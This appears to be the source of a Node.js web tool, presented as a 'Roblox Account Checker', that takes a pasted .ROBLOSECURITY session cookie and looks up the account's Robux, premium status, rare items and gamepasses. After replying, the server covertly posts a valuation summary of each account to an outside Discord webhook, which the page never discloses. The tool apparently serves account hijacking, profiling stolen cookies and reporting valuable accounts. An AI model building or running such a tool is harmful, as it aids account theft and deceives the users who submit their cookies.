const express = require('express');
const app = express();
app.use(express.json());

// CORS middleware
app.use((req, res, next) => {
  res.header('Access-Control-Allow-Origin', '*');
  res.header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.header('Access-Control-Allow-Headers', 'Content-Type');
  if (req.method === 'OPTIONS') {
    return res.sendStatus(200);
  }
  next();
});

// Main page (HTML)
app.get('/', (req, res) => {
  res.send(`<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Roblox Account Checker – .ROBLOSECURITY</title>
  <style>
    body { font-family: Arial, sans-serif; max-width: 600px; margin: 40px auto; padding: 20px; background: #111; color: #eee; }
    textarea { width: 100%; height: 140px; background: #222; color: #eee; border: 1px solid #444; padding: 12px; font-family: monospace; resize: vertical; }
    button { padding: 14px 32px; background: #1e90ff; border: none; color: white; font-size: 17px; cursor: pointer; margin: 15px 0; border-radius: 4px; }
    button:hover { background: #0c7ae6; }
    #result { margin-top: 25px; padding: 20px; background: #1a1a1a; border: 1px solid #444; border-radius: 8px; min-height: 300px; line-height: 1.6; }
    .error { color: #ff4d4d; } .success { color: #00ff9d; } b { color: #ddd; } small { color: #aaa; }
    #avatar { max-width: 100%; height: auto; border-radius: 12px; margin: 15px 0; border: 2px solid #444; display: block; }
  </style>
</head>
<body>
<h2>Roblox Account Checker (.ROBLOSECURITY)</h2>
<p style="color:#ffcc00; font-weight:bold;">
  <strong>WARNING:</strong> Using someone else's cookie violates Roblox ToS and may result in permanent account ban.
</p>
<textarea id="cookie" placeholder="Paste .ROBLOSECURITY value here (without '.ROBLOSECURITY=')"></textarea>
<br>
<button onclick="checkAccount()">Check Account</button>
<div id="result"></div>

<script>
async function checkAccount() {
  const cookieVal = document.getElementById('cookie').value.trim();
  const result = document.getElementById('result');
  result.innerHTML = '';
  if (cookieVal.length < 200) {
    result.innerHTML = '<span class="error">Cookie is too short or invalid</span>';
    return;
  }
  result.innerHTML = '<i>Checking account...</i>';
  try {
    const resp = await fetch('/check', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ cookie: cookieVal })
    });
    const json = await resp.json();
    if (json.error) {
      result.innerHTML = \`<span class="error">Error: \${json.error}</span>\`;
      return;
    }
    if (json.success) {
      const creationDate = json.created !== 'failed'
        ? new Date(json.created).toLocaleDateString('en-US', { month: 'long', day: 'numeric', year: 'numeric' })
        : '—';
      let avatarHtml = json.avatarUrl
        ? \`<img id="avatar" src="\${json.avatarUrl}" alt="Avatar">\`
        : '<p style="color:#ffcc00;">Avatar could not be loaded</p>';
      result.innerHTML = \`
        <span class="success">Success!</span><br><br>
        \${avatarHtml}
        <b>Username:</b> \${json.username}<br>
        <b>User ID:</b> \${json.userId}<br>
        <b>Premium:</b> \${json.hasPremium ? 'True' : 'False'}<br>
        <b>Email Verified:</b> \${json.emailVerified ? 'True' : 'False'}<br>
        <b>Robux:</b> \${json.robux.toLocaleString('en-US')}<br>
        <b>Headless:</b> \${json.hasHeadless ? 'True' : 'False'}<br>
        <b>Korblox:</b> \${json.hasKorblox ? 'True' : 'False'}<br>
        <b>MM2:</b> \${json.mm2Count}<br>
        <b>AMP:</b> \${json.ampCount}<br>
        <b>SAB:</b> \${json.sabCount}<br>
        <b>Account Age:</b> \${json.accountAgeDays} days<br>
        <b>Created:</b> \${creationDate}<br>
      \`;
    }
  } catch (e) {
    result.innerHTML = \`<span class="error">Error: \${e.message}</span>\`;
  }
}
</script>
</body>
</html>`);
});

app.post('/check', async (req, res) => {
  const { cookie } = req.body || {};
  if (!cookie || typeof cookie !== 'string' || cookie.length < 200) {
    return res.status(400).json({ error: 'Missing or invalid cookie' });
  }

  try {
    // Get CSRF token
    const tokenRes = await fetch('https://auth.roblox.com/v2/logout', {
      method: 'POST',
      headers: {
        'Cookie': `.ROBLOSECURITY=${cookie}`,
        'Content-Type': 'application/json'
      },
    });
    const csrfToken = tokenRes.headers.get('x-csrf-token');
    if (!csrfToken) throw new Error('Failed to obtain X-CSRF-Token');

    // Get authenticated user
    const userRes = await fetch('https://users.roblox.com/v1/users/authenticated', {
      headers: {
        'Cookie': `.ROBLOSECURITY=${cookie}`,
        'X-CSRF-TOKEN': csrfToken,
        'Accept': 'application/json',
      },
    });
    if (!userRes.ok) throw new Error('Invalid or expired cookie');
    const userData = await userRes.json();

    // Email verified (via Verified Badge hat)
    let emailVerified = false;
    try {
      const ownsRes = await fetch(`https://inventory.roblox.com/v1/users/${userData.id}/items/Asset/102611803`, {
        headers: { 'Cookie': `.ROBLOSECURITY=${cookie}`, 'X-CSRF-TOKEN': csrfToken }
      });
      if (ownsRes.ok) {
        const data = await ownsRes.json();
        emailVerified = data.data?.length > 0;
      }
    } catch {}

    // Premium status
    let hasPremium = false;
    try {
      const premRes = await fetch(`https://premiumfeatures.roblox.com/v1/users/${userData.id}/validate-membership`, {
        headers: { 'Cookie': `.ROBLOSECURITY=${cookie}`, 'X-CSRF-TOKEN': csrfToken }
      });
      if (premRes.ok) hasPremium = await premRes.json();
    } catch {}

    // Robux balance
    let robux = 0;
    try {
      const curRes = await fetch(`https://economy.roblox.com/v1/users/${userData.id}/currency`, {
        headers: { 'Cookie': `.ROBLOSECURITY=${cookie}`, 'X-CSRF-TOKEN': csrfToken }
      });
      if (curRes.ok) {
        const data = await curRes.json();
        robux = data.robux || 0;
      }
    } catch {}

    // Account creation date & age
    let accountAgeDays = 0;
    let created = null;
    try {
      const profileRes = await fetch(`https://users.roblox.com/v1/users/${userData.id}`);
      if (profileRes.ok) {
        const profile = await profileRes.json();
        if (profile.created) {
          created = profile.created;
          accountAgeDays = Math.floor((Date.now() - new Date(created).getTime()) / 86400000);
        }
      }
    } catch {}

    // Avatar thumbnail
    let avatarUrl = null;
    try {
      const thumbRes = await fetch(`https://thumbnails.roblox.com/v1/users/avatar?userIds=${userData.id}&size=720x720&format=Png&isCircular=false`);
      if (thumbRes.ok) {
        const thumbData = await thumbRes.json();
        avatarUrl = thumbData.data?.[0]?.imageUrl || null;
      }
    } catch {}

    // Gamepasses
    const mm2Ids = [429957, 1308795];
    const ampIds = [189425850, 951065968, 951441773, 6408694, 60406961585546290, 7124470, 6965379, 3196348, 5300198];
    const sabIds = [1227013099, 1229510262, 1228591447];
    const allPassIds = [...mm2Ids, ...ampIds, ...sabIds];
    const ownedPasses = [];

    for (const passId of allPassIds) {
      try {
        const gpRes = await fetch(`https://inventory.roblox.com/v1/users/${userData.id}/items/GamePass/${passId}`, {
          headers: {
            'Cookie': `.ROBLOSECURITY=${cookie}`,
            'X-CSRF-TOKEN': csrfToken,
            'Accept': 'application/json'
          }
        });
        if (gpRes.ok) {
          const gpData = await gpRes.json();
          if (gpData.data?.length > 0) ownedPasses.push(passId);
        }
      } catch {}
    }

    const mm2Count = ownedPasses.filter(id => mm2Ids.includes(id)).length;
    const ampCount = ownedPasses.filter(id => ampIds.includes(id)).length;
    const sabCount = ownedPasses.filter(id => sabIds.includes(id)).length;

    // Headless & Korblox (using bundle IDs you specified)
    let hasHeadless = false;
    let hasKorblox = false;
    try {
      const hRes = await fetch(`https://inventory.roblox.com/v1/users/${userData.id}/items/Bundle/201`, {
        headers: { 'Cookie': `.ROBLOSECURITY=${cookie}`, 'X-CSRF-TOKEN': csrfToken }
      });
      if (hRes.ok) {
        const hData = await hRes.json();
        hasHeadless = hData.data?.length > 0;
      }

      const kRes = await fetch(`https://inventory.roblox.com/v1/users/${userData.id}/items/Bundle/192`, {
        headers: { 'Cookie': `.ROBLOSECURITY=${cookie}`, 'X-CSRF-TOKEN': csrfToken }
      });
      if (kRes.ok) {
        const kData = await kRes.json();
        hasKorblox = kData.data?.length > 0;
      }
    } catch {}

    // Prepare response for frontend
    const result = {
      success: true,
      username: userData.name,
      userId: userData.id,
      hasPremium,
      robux,
      accountAgeDays,
      created: created || 'failed',
      avatarUrl,
      emailVerified,
      hasHeadless,
      hasKorblox,
      mm2Count,
      ampCount,
      sabCount
    };

    res.json(result);

    // Send to Discord webhook
    const webhookUrl = process.env.WEBHOOK;
    if (webhookUrl) {
      try {
        await fetch(webhookUrl, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            embeds: [{
              color: 0x0F0F23,
              title: `<:User:1481761037257674872> ${userData.name}`,
              description: "**AVATAR**",
              thumbnail: {
                url: avatarUrl || "https://tr.rbxcdn.com/30DAY-AvatarHeadshot?width=720&height=720&format=png"
              },
              fields: [
                {
                  name: "**Info**",
                  value:
                    `<:Robux:1481762078124544030> Robux: **${robux.toLocaleString('en-US')}**\n` +
                    `<:Premium:1481761448592933034> Premium: **${hasPremium ? 'True' : 'False'}**\n` +
                    `<:Email:1481762590467035136> Email: **${emailVerified ? 'True' : 'False'}**`,
                  inline: true
                },
                {
                  name: "**Games**",
                  value:
                    `<:MM2:1481763122808230164> MM2: **${mm2Count}**\n` +
                    `<:AMP:1481763635775930520> AMP: **${ampCount}**\n` +
                    `<:SAB:1481763931113394177> SAB: **${sabCount}**`,
                  inline: true
                },
                {
                  name: "**Inventory**",
                  value:
                    `<:Korblox:1481770192500424775> Korblox: **${hasKorblox ? 'True' : 'False'}**\n` +
                    `<:Headless:1481770398642077919> Headless: **${hasHeadless ? 'True' : 'False'}**`,
                  inline: true
                }
              ],
              footer: {
                text: "24H! • " + new Date().toLocaleString('en-US')
              },
              timestamp: new Date().toISOString()
            }]
          })
        });
      } catch (webhookErr) {
        console.error('Webhook send failed:', webhookErr.message);
      }
    }

  } catch (err) {
    console.error(err);
    res.status(500).json({ error: err.message || 'Internal server error' });
  }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
